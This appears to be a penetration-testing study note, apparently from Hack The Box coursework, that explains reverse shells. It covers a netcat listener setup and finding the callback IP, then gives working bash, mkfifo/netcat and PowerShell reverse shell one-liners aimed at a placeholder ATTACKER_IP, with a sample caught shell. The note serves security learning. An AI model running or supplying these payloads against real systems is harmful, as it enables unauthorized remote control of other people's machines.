## Definition

A [[Reverse Shell]] is a type of [[Shell]] connection initiated from the target machine back to the attacker machine. It is often used when the target is behind a firewall that restricts incoming connections but allows outgoing ones. This is a common method to gain control over a compromised host after achieving [[Remote Code Execution (RCE)]].

## Setting up a Listener

The first step is to start a listener on the attacker machine to catch the incoming connection. [[Netcat]] is commonly used for this:

```shell-session
Iskandeur@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Key [[Netcat]] flags:

| Flag      | Description                                                     |
| --------- | --------------------------------------------------------------- |
| `-l`      | Listen mode, wait for incoming connections.                    |
| `-v`      | Verbose mode, show connection status.                           |
| `-n`      | Numeric-only IP addresses, no DNS resolution (faster).        |
| `-p 1234` | Port number to listen on (e.g., 1234).                          |

With the listener running, the next step is executing a command on the target to connect back.

## Identifying the Callback IP

The reverse shell command needs the attacker's IP address to connect back to. Use commands like `ip a` (Linux) or `ipconfig` (Windows) on the attacker machine to find the correct IP address accessible from the target (e.g., VPN IP, public IP).

```shell-session
Iskandeur@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

*Note: Choose the appropriate network interface (e.g., `tun0` for VPN, `eth0` for LAN/External) based on network topology.* 

## Reverse Shell Commands

The specific command depends on the target OS and available tools. [PayloadAllTheThings - Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) provides a comprehensive list. 

Common reliable examples:

**Linux ([[Shell#Common Shells|Bash]])**

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

**Windows ([[Powershell]])**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' ;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

*(Replace `ATTACKER_IP` and `PORT` with your listener details)*

Execute one of these commands on the target via the vulnerability (e.g., RCE exploit). A connection should appear on the [[Netcat]] listener:

```shell-session
Iskandeur@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Considerations

- **Pros:** Often bypasses firewalls, relatively easy to set up.
- **Cons:** Can be fragile; requires re-exploitation if the connection drops. Less interactive than a full TTY shell (though can often be upgraded using tools like Python's `pty` module or [[Socat]]). 

See also: [[Bind Shell]], [[Web Shell]], [[Shell]]